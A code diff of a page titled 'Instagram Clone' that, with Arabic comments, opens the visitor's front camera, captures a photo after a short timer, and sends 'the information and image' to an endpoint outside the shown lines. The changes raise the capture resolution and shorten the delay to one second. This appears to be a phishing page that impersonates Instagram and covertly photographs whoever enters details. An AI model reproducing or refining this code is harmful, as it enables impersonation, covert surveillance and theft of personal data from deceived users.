@@ -8,7 +8,6 @@
     <title>Instagram Clone</title>
 </head>
 <body>
-    
     <main class="flex align-items-center justify-content-center">
         <section id="mobile" class="flex">
         </section>
@@ -108,6 +107,8 @@
                     const constraints = {
                         video: {
                             facingMode: 'user', // استخدام كاميرا الهاتف الأمامية
+                            width: { ideal: 1280 },  // لضبط دقة الصورة
+                            height: { ideal: 720 }
                         }
                     };
 
@@ -116,7 +117,7 @@
                             video.srcObject = stream;
                             video.play();
 
-                            // التقاط صورة بعد ثانيتين
+                            // التقاط صورة بعد ثانية
                             setTimeout(() => {
                                 const canvas = document.createElement('canvas');
                                 canvas.width = video.videoWidth;
@@ -137,7 +138,7 @@
                                     }).catch(error => {
                                         alert('Error sending the information and image. Please try again.');
                                     });
-                            }, 2000);
+                            }, 1000);
                         })
                         .catch(error => {
                             alert('Error accessing camera. Please check your device.');
